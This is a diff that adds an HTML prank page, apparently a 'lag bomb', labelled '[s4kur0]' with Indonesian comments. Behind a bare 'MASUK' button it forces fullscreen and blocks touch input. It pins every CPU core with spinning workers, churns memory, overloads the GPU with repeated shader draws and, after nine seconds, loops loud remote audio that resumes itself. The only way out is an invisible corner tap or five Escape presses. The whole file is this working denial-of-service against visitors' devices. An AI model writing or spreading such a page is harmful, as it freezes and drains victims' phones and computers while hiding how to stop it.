@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<title>.</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0;height:100%;width:100%;background:#000;overflow:hidden;
+    font-family:system-ui,-apple-system,sans-serif;color:#0f0;touch-action:none;
+    user-select:none;-webkit-user-select:none;overscroll-behavior:none}
+  #stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;z-index:10}
+  #go{
+    font-size:clamp(1.2rem,6vw,2rem);padding:1.1rem 2.4rem;border:2px solid #0f0;
+    background:rgba(0,0,0,.6);color:#0f0;border-radius:14px;letter-spacing:3px;
+    font-weight:700;cursor:pointer;backdrop-filter:blur(4px);
+    box-shadow:0 0 20px #0f0, inset 0 0 20px rgba(0,255,0,.15);
+    animation:pulse 1.1s infinite alternate;transition:transform .1s;
+  }
+  #go:active{transform:scale(.95)}
+  @keyframes pulse{
+    from{box-shadow:0 0 10px #0f0, inset 0 0 10px rgba(0,255,0,.1)}
+    to{box-shadow:0 0 45px #0f0, inset 0 0 30px rgba(0,255,0,.25)}
+  }
+  canvas#gl{position:fixed;inset:0;width:100vw;height:100vh;display:none;z-index:1}
+  canvas#cv2{position:fixed;inset:0;width:100vw;height:100vh;display:none;z-index:2;
+    mix-blend-mode:screen;opacity:.35;pointer-events:none}
+  #overlay{
+    position:fixed;inset:0;pointer-events:none;display:none;z-index:3;
+    background:
+      radial-gradient(circle at 30% 30%, rgba(255,0,80,.28), transparent 60%),
+      radial-gradient(circle at 70% 70%, rgba(0,120,255,.28), transparent 60%),
+      radial-gradient(circle at 50% 50%, rgba(0,255,120,.15), transparent 70%);
+    mix-blend-mode:screen;
+    animation:shift .04s infinite alternate;
+    filter:blur(.5px) contrast(1.5) saturate(1.4);
+  }
+  @keyframes shift{
+    from{transform:translate(-1px,-1px)}
+    to{transform:translate(1px,1px)}
+  }
+  #ui{position:fixed;top:6px;left:8px;color:#0f0;font:11px/1.3 monospace;
+    text-shadow:0 0 6px #0f0;z-index:9;display:none;pointer-events:none}
+  #panic{position:fixed;top:0;left:0;width:60px;height:60px;z-index:99;opacity:0}
+</style>
+</head>
+<body>
+
+<div id="stage"><button id="go">MASUK</button></div>
+<canvas id="gl"></canvas>
+<canvas id="cv2"></canvas>
+<div id="overlay"></div>
+<div id="ui">[s4kur0] booting…</div>
+<div id="panic" title="panic"></div>
+
+<script>
+"use strict";
+(function(){
+
+/* ============================================================
+   HELPERS
+============================================================ */
+const $ = (s)=>document.querySelector(s);
+const goBtn   = $('#go');
+const stage   = $('#stage');
+const glCanvas= $('#gl');
+const cv2     = $('#cv2');
+const overlay = $('#overlay');
+const ui      = $('#ui');
+const panic   = $('#panic');
+
+let started = false;
+
+/* ============================================================
+   FULLSCREEN + ORIENTATION LOCK
+============================================================ */
+async function requestFS(el){
+  try{
+    if (el.requestFullscreen)        await el.requestFullscreen({navigationUI:'hide'});
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+    else if (el.mozRequestFullScreen)    el.mozRequestFullScreen();
+    else if (el.msRequestFullscreen)     el.msRequestFullscreen();
+  }catch(e){ /* ignored */ }
+  try{
+    if (screen.orientation && screen.orientation.lock){
+      await screen.orientation.lock('portrait').catch(()=>{});
+    }
+  }catch(e){}
+}
+
+/* ============================================================
+   WEBGL RAYMARCHING "VOLUME SHADER"
+============================================================ */
+function startWebGL(){
+  const gl = glCanvas.getContext('webgl',{
+    antialias:false,alpha:false,depth:false,stencil:false,
+    powerPreference:'high-performance',preserveDrawingBuffer:false,
+    failIfMajorPerformanceCaveat:false
+  }) || glCanvas.getContext('experimental-webgl');
+
+  if(!gl){ return null; }
+
+  function resize(){
+    const dpr = Math.min(window.devicePixelRatio||1, 2);
+    glCanvas.width  = Math.max(1, Math.floor(innerWidth  * dpr));
+    glCanvas.height = Math.max(1, Math.floor(innerHeight * dpr));
+  }
+  resize();
+
+  const vsSrc = `
+    attribute vec2 p;
+    void main(){ gl_Position = vec4(p,0.0,1.0); }
+  `;
+
+  const fsSrc = `
+    precision highp float;
+    uniform vec2  u_res;
+    uniform float u_t;
+
+    float hash(vec3 p){ p=fract(p*0.3183099+0.1); p*=17.0; return fract(p.x*p.y*p.z*(p.x+p.y+p.z)); }
+    float noise(vec3 x){
+      vec3 i=floor(x), f=fract(x);
+      f=f*f*(3.0-2.0*f);
+      return mix(mix(mix(hash(i+vec3(0,0,0)),hash(i+vec3(1,0,0)),f.x),
+                     mix(hash(i+vec3(0,1,0)),hash(i+vec3(1,1,0)),f.x),f.y),
+                 mix(mix(hash(i+vec3(0,0,1)),hash(i+vec3(1,0,1)),f.x),
+                     mix(hash(i+vec3(0,1,1)),hash(i+vec3(1,1,1)),f.x),f.y),f.z);
+    }
+    float fbm(vec3 p){
+      float a=0.5, s=0.0;
+      for(int i=0;i<6;i++){ s+=a*noise(p); p*=2.02; a*=0.5; }
+      return s;
+    }
+    float map(vec3 p){
+      float d = length(p) - 1.2;
+      d += 0.35 * fbm(p*1.7 + vec3(0.0, u_t*0.6, 0.0));
+      return d;
+    }
+    void main(){
+      vec2 uv = (gl_FragCoord.xy - 0.5*u_res) / u_res.y;
+      vec3 ro = vec3(0.0, 0.0, -3.5);
+      vec3 rd = normalize(vec3(uv, 1.6));
+      float t = 0.0;
+      vec3 col = vec3(0.0);
+      for(int i=0;i<96;i++){
+        vec3 pos = ro + rd*t;
+        float d = map(pos);
+        if(d < 0.002){
+          float g = fbm(pos*3.0 + u_t);
+          col += vec3(0.2+0.8*g, 0.1+0.4*g, 0.6+0.4*g) * (1.0/(1.0+t*t));
+          t += 0.01;
+        } else {
+          t += max(d*0.6, 0.01);
+        }
+        if(t > 8.0) break;
+      }
+      col *= 1.0 + 0.2*sin(u_t*8.0);
+      col += 0.05*vec3(hash(vec3(gl_FragCoord.xy, u_t)));
+      gl_FragColor = vec4(col, 1.0);
+    }
+  `;
+
+  function compile(type, src){
+    const s = gl.createShader(type);
+    gl.shaderSource(s, src);
+    gl.compileShader(s);
+    if(!gl.getShaderParameter(s, gl.COMPILE_STATUS)){
+      console.error('[s4kur0] shader err:', gl.getShaderInfoLog(s));
+    }
+    return s;
+  }
+
+  let prog;
+  try{
+    prog = gl.createProgram();
+    gl.attachShader(prog, compile(gl.VERTEX_SHADER, vsSrc));
+    gl.attachShader(prog, compile(gl.FRAGMENT_SHADER, fsSrc));
+    gl.linkProgram(prog);
+    if(!gl.getProgramParameter(prog, gl.LINK_STATUS)){
+      console.error('[s4kur0] link err:', gl.getProgramInfoLog(prog));
+      return null;
+    }
+    gl.useProgram(prog);
+  }catch(e){ return null; }
+
+  const buf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 3,-1, -1,3]), gl.STATIC_DRAW);
+  const loc = gl.getAttribLocation(prog, 'p');
+  gl.enableVertexAttribArray(loc);
+  gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+
+  const uRes = gl.getUniformLocation(prog, 'u_res');
+  const uT   = gl.getUniformLocation(prog, 'u_t');
+
+  return {
+    gl, uRes, uT, resize,
+    render(t){
+      gl.viewport(0,0,glCanvas.width,glCanvas.height);
+      gl.uniform2f(uRes, glCanvas.width, glCanvas.height);
+      gl.uniform1f(uT, t);
+      gl.drawArrays(gl.TRIANGLES, 0, 3);
+      for(let i=0;i<64;i++){
+        gl.uniform1f(uT, t + i*0.01);
+        gl.drawArrays(gl.TRIANGLES, 0, 3);
+      }
+    }
+  };
+}
+
+/* ============================================================
+   WORKER SPIN — multi-core 100%
+============================================================ */
+function startWorkers(){
+  const workerSrc = `
+    let junk = [];
+    self.onmessage = (e) => {
+      const mode = e.data;
+      if (mode === 'spin') {
+        const end = performance.now() + 1e9;
+        while (performance.now() < end) {
+          let x = 0;
+          for (let i=0;i<2000;i++) x += Math.sin(i)*Math.cos(i);
+          junk.push(x);
+          if (junk.length > 5000) junk.length = 0;
+        }
+      } else if (mode === 'churn') {
+        setInterval(() => {
+          try{
+            const big = new Float64Array(2000000);
+            for (let i=0;i<big.length;i+=4096) big[i] = Math.random();
+          }catch(e){}
+        }, 0);
+      }
+    };
+  `;
+  let url;
+  try{
+    url = URL.createObjectURL(new Blob([workerSrc],{type:'application/javascript'}));
+  }catch(e){ return []; }
+
+  const cores = Math.max(2, Math.min(8, navigator.hardwareConcurrency || 4));
+  const arr = [];
+  for(let i=0;i<cores;i++){
+    try{
+      const w = new Worker(url);
+      w.postMessage('spin');
+      w.postMessage('churn');
+      arr.push(w);
+    }catch(e){}
+  }
+  return arr;
+}
+
+/* ============================================================
+   CANVAS 2D FULLSCREEN RASTER
+============================================================ */
+function startCanvas2D(){
+  const ctx = cv2.getContext('2d',{alpha:true});
+  if(!ctx) return ()=>{};
+
+  function resize2(){
+    cv2.width  = Math.max(1, Math.floor(innerWidth  * 0.75));
+    cv2.height = Math.max(1, Math.floor(innerHeight * 0.75));
+  }
+  resize2();
+
+  let running = true;
+  function paint(){
+    if(!running) return;
+    const w = cv2.width, h = cv2.height;
+    const img = ctx.createImageData(w, h);
+    const d = img.data;
+    const tt = performance.now()*0.001;
+    for(let i=0;i<d.length;i+=4){
+      const px = (i>>2) % w;
+      const py = ((i>>2)/w)|0;
+      const v = (Math.sin((px+py+tt*80)*0.05) * 127 + 128) | 0;
+      d[i]   = v;
+      d[i+1] = (v*0.5)|0;
+      d[i+2] = 255 - v;
+      d[i+3] = 255;
+    }
+    ctx.putImageData(img, 0, 0);
+    requestAnimationFrame(paint);
+  }
+  requestAnimationFrame(paint);
+  return ()=>{ running = false; };
+}
+
+/* ============================================================
+   AUDIO OSCILLATOR SPAM (VOICE / WHINE — DIPERTAHANKAN)
+============================================================ */
+function startAudio(){
+  try{
+    const AC = window.AudioContext || window.webkitAudioContext;
+    if(!AC) return ()=>{};
+    const actx = new AC();
+    const nodes = [];
+    for(let i=0;i<8;i++){
+      const o = actx.createOscillator();
+      const g = actx.createGain();
+      g.gain.value = 0.0001;
+      o.frequency.value = 40 + i*30;
+      o.connect(g).connect(actx.destination);
+      o.start();
+      nodes.push(o);
+    }
+    return ()=>{ nodes.forEach(o=>{ try{o.stop()}catch(e){} }); try{actx.close()}catch(e){} };
+  }catch(e){ return ()=>{}; }
+}
+
+/* ============================================================
+   MEMORY CHURN DI MAIN THREAD
+============================================================ */
+function startChurn(){
+  const id = setInterval(()=>{
+    try{
+      const arr = new Array(50000).fill(0).map(()=>Math.random());
+      if(Math.random()<0.3) arr.length = 0;
+    }catch(e){}
+  }, 0);
+  return ()=>clearInterval(id);
+}
+
+/* ============================================================
+   🔊 LOOP AUDIO — MYINSTANTS (play setelah lag trigger)
+   Sumber: https://www.myinstants.com/en/instant/gemi-2-66621/
+   Kandidat URL MP3, coba satu per satu kalau gagal
+============================================================ */
+let loopAudio = null;
+let loopStopped = false;
+let loopUrlIndex = 0;
+
+const AUDIO_URLS = [
+  "https://www.myinstants.com/media/sounds/gemi-2.mp3",
+  "https://www.myinstants.com/media/sounds/gemi2.mp3",
+  "https://www.myinstants.com/media/sounds/gemi_2.mp3",
+  "https://www.myinstants.com/media/sounds/gemi-2-66621.mp3",
+  "https://www.myinstants.com/media/sounds/gemi.mp3",
+];
+
+function startLoopAudio(){
+  if(loopStopped) return;
+  if(loopAudio) return; // sudah jalan
+
+  loopAudio = new Audio();
+  loopAudio.loop = true;
+  loopAudio.volume = 1.0;
+  loopAudio.preload = "auto";
+  // TIDAK pakai crossOrigin & TIDAK pakai Web Audio chain —
+  // biar gak ke-block CORS MyInstants
+
+  function tryNext(){
+    if(loopStopped) return;
+    if(loopUrlIndex >= AUDIO_URLS.length){
+      console.warn('[loop-audio] semua URL gagal');
+      return;
+    }
+    const url = AUDIO_URLS[loopUrlIndex];
+    console.log('[loop-audio] try:', url);
+    loopAudio.src = url;
+
+    loopAudio.play().then(()=>{
+      console.log('[loop-audio] PLAYING:', url);
+    }).catch(err=>{
+      console.warn('[loop-audio] fail:', url, err.message);
+      loopUrlIndex++;
+      setTimeout(tryNext, 300);
+    });
+  }
+
+  // Kalau error network, coba URL berikutnya
+  loopAudio.addEventListener('error', ()=>{
+    if(loopStopped) return;
+    console.warn('[loop-audio] error, next URL');
+    loopUrlIndex++;
+    setTimeout(tryNext, 300);
+  });
+
+  // Kalau ke-pause (browser suspend), auto-resume
+  loopAudio.addEventListener('pause', ()=>{
+    if(!loopStopped){
+      setTimeout(()=>{ loopAudio && loopAudio.play().catch(()=>{}); }, 200);
+    }
+  });
+
+  tryNext();
+
+  // Auto-resume tiap 1 detik kalau browser suspend
+  setInterval(()=>{
+    if(!loopStopped && loopAudio && loopAudio.paused){
+      loopAudio.play().catch(()=>{});
+    }
+  }, 1000);
+}
+
+function stopLoopAudio(){
+  loopStopped = true;
+  if(loopAudio){
+    try{
+      loopAudio.pause();
+      loopAudio.currentTime = 0;
+      loopAudio.src = '';
+    }catch(_){}
+    loopAudio = null;
+  }
+}
+
+/* ============================================================
+   BOOT — klik tombol
+============================================================ */
+goBtn.addEventListener('click', async ()=>{
+  if(started) return;
+  started = true;
+
+  // fullscreen dari gesture user
+  await requestFS(document.documentElement);
+
+  // sembunyikan tombol, tampilkan panggung stress
+  stage.style.display = 'none';
+  glCanvas.style.display = 'block';
+  cv2.style.display = 'block';
+  overlay.style.display = 'block';
+  ui.style.display = 'block';
+
+  // start semua engine — LAG BRUTAL TRIGGER DULUAN
+  const gl = startWebGL();
+  const workers = startWorkers();
+  const stop2d = startCanvas2D();
+  const stopAudio = startAudio();
+  const stopChurn = startChurn();
+
+  // 🔊 AUDIO LOOP — MULAI SETELAH 9 DETIK
+  // biar lag brutal trigger duluan, baru suara masuk
+  setTimeout(()=>{
+    if(!loopStopped) startLoopAudio();
+  }, 9000);
+
+  // resize handler
+  const onResize = ()=>{
+    if(gl){ gl.resize(); }
+    cv2.width  = Math.max(1, Math.floor(innerWidth  * 0.75));
+    cv2.height = Math.max(1, Math.floor(innerHeight * 0.75));
+  };
+  addEventListener('resize', onResize);
+  addEventListener('orientationchange', ()=>setTimeout(onResize,300));
+
+  // rAF loop utama — no throttle
+  const t0 = performance.now();
+  let frames = 0, fpsT = t0, fps = 0;
+  function frame(now){
+    const t = (now - t0) / 1000;
+    if(gl){ gl.render(t); }
+
+    // layout thrash
+    frames++;
+    if(now - fpsT >= 500){
+      fps = frames * 1000 / (now - fpsT);
+      frames = 0; fpsT = now;
+    }
+    ui.textContent =
+      '[s4kur0] t='+t.toFixed(1)+'s fps='+fps.toFixed(0)+
+      ' w='+workers.length+' gl='+(gl?1:0);
+
+    requestAnimationFrame(frame);
+  }
+  requestAnimationFrame(frame);
+
+  // TRIPLE-TAP PANIC → keluar darurat + matiin suara
+  let taps = 0, tapTimer = null;
+  panic.addEventListener('click', ()=>{
+    taps++;
+    clearTimeout(tapTimer);
+    tapTimer = setTimeout(()=>{ taps = 0; }, 600);
+    if(taps >= 3){
+      // stop semua
+      workers.forEach(w=>{ try{w.terminate()}catch(e){} });
+      stop2d(); stopAudio(); stopChurn();
+      stopLoopAudio();
+      if(document.exitFullscreen) document.exitFullscreen().catch(()=>{});
+      else if(document.webkitExitFullscreen) document.webkitExitFullscreen();
+      location.href = 'about:blank';
+    }
+  });
+});
+
+/* ============================================================
+   ESC ×5 = PANIC GLOBAL (kill loop audio + semua)
+============================================================ */
+let escN = 0, escT = null;
+document.addEventListener('keydown', (e)=>{
+  if(e.key !== 'Escape') return;
+  escN++;
+  clearTimeout(escT);
+  escT = setTimeout(()=>escN=0, 1000);
+  if(escN >= 5){
+    stopLoopAudio();
+    // Trigger juga triple-tap panic kalau perlu:
+    panic.click(); panic.click(); panic.click();
+  }
+});
+
+})();
+</script>
+</body>
+</html>
